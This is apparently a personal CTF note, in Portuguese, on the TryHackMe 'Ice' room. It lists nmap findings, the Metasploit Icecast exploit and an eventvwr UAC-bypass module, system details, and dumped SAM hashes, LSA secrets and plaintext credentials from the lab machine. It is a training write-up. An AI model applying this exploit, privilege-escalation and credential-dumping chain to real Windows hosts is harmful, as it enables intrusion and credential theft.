#ctf
# ICE
https://tryhackme.com/room/ice

## NMAP
- Portas abertas e serviços:
  - 135/tcp: MSRPC (Microsoft Windows RPC)
  - 139/tcp: NetBIOS-SSN (Microsoft Windows NetBIOS-SSN)
  - 445/tcp: Microsoft-DS (Microsoft Windows 7-10)
  - 3389/tcp: SSL/MS-WBT-SERVER?
  - 5357/tcp: HTTP (Microsoft HTTPAPI httpd 2.0 - SSDP/UPnP)
  - 8000/tcp: HTTP (Icecast streaming media server)
  - 49152/tcp, 49153/tcp, 49154/tcp, 49158/tcp, 49159/tcp, 49160/tcp: MSRPC (Microsoft Windows RPC)
- Informações do Serviço: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

## CME
- Windows 7 Professional Service Pack 1 x64 (nome: DARK-PC) (domínio: Dark-PC)

## METASPLOIT
- Exploit: exploit/windows/http/icecast_header

## Informações do Host
- Nome do Host: DARK-PC
- Nome do SO: Microsoft Windows 7 Professional
- Versão do SO: 6.1.7601 Service Pack 1 Build 7601
- Fabricante do SO: Microsoft Corporation
- Configuração do SO: Estação de trabalho autônoma
- Tipo de Compilação do SO: Multiprocessador Livre
- Proprietário Registrado: Dark
- ID do Produto: 00371-177-0000061-85305
- Data de Instalação Original: 11/12/2019, 4:48:23 PM
- Hora de Inicialização do Sistema: 2/2/2023, 10:50:27 AM
- Fabricante do Sistema: Xen
- Modelo do Sistema: HVM domU
- Tipo de Sistema: PC baseado em x64
- Processador(es): 1 Processador(es) Instalado(s).
  - [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
- Versão da BIOS: Xen 4.11.amazon, 8/24/2006
- Diretório do Windows: C:\Windows
- Diretório do Sistema: C:\Windows\system32
- Dispositivo de Inicialização: \Device\HarddiskVolume1
- Localidade do Sistema: en-us; Inglês (Estados Unidos)
- Localidade de Entrada: en-us; Inglês (Estados Unidos)
- Fuso Horário: (UTC-06:00) Horário Central (EUA e Canadá)
- Memória Física Total: 2.048 MB
- Memória Física Disponível: 1.423 MB
- Memória Virtual: Tamanho Máximo: 4.095 MB
- Memória Virtual: Disponível: 3.380 MB
- Memória Virtual: Em Uso: 715 MB
- Localização do Arquivo de Página(s): C:\pagefile.sys
- Domínio: WORKGROUP
- Servidor de Logon: \\DARK-PC
- Correções Quentes: 2 Correções Quentes Instaladas.
  - [01]: KB2534111
  - [02]: KB976902
- Placa(s) de Rede: 1 Placa(s) de Rede Instalada(s).
  - [01]: AWS PV Network Device
    - Nome da Conexão: Local Area Connection 2
    - DHCP Habilitado: Sim
    - Servidor DHCP: 10.10.0.1
    - Endereço IP(s)
      - [01]: 10.10.50.220
      - [02]: fe80::c24:b17c:8e53:23ef

## METASPLOIT
- Exploit: exploit/windows/local/bypassuac_eventwr

### Dumping SAM
- Domínio: DARK-PC
- SysKey: e8764ef63a8864b8326f31fae6b3ad34
- SID Local: S-1-5-21-2096091615-1365079743-3039020981

#### Contas no SAM:
1. Administrador
   - Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

2. Convidado

3. Dark
   - Hash NTLM: 7c4fe5eada682714a036e39378362bab

### Dumping LSA Secrets
- Domínio: DARK-PC
- SysKey: e8764ef63a8864b8326f31fae6b3ad34

#### Segredos no LSA:
1. Nome Local: Dark-PC (S-1-5-21-2096091615-1365079743-3039020981)
   - Nome do Domínio: WORKGROUP
   - Subsistema de Política: 1.11
   - Chave(s) LSA: 1, padrão {a64b88f9-c08b-9b33-2a8f-2097d1cbefae}
     - [00]: {a64b88f9-c08b-9b33-2a8f-2097d1cbefae} 
       - Segredo: DefaultPassword
         - Valor: Password01!
        
### Recuperando Todas as Credenciais
#### Credenciais MSV
| Usuário | Domínio  | LM                          | NTLM                         | SHA1                          |
| ------- | -------- | --------------------------- | ---------------------------- | ----------------------------- |
| Dark    | Dark-PC  | e52cac67419a9a22ecb0836909  | 7c4fe5eada682714a036e393783  | 0d082c4b4f2aeafb67fd0ea568a9ed30262bab997e9d3ebc0eb |

#### Credenciais WDigest
| Usuário  | Domínio     | Senha       |
| -------- | ----------- | ----------- |
| (null)   | (null)      | (null)      |
| DARK-PC$ | WORKGROUP   | (null)      |
| Dark     | Dark-PC     | Password01! |

#### Credenciais TSPKG
| Usuário | Domínio  | Senha       |
| ------- | -------- | ----------- |
| Dark    | Dark-PC  | Password01! |

#### Credenciais Kerberos
| Usuário  | Domínio     | Senha       |
| -------- | ----------- | ----------- |
| (null)   | (null)      | (null)      |
| Dark     | Dark-PC     | Password01! |
| dark-pc$ | WORKGROUP   | (null)      |

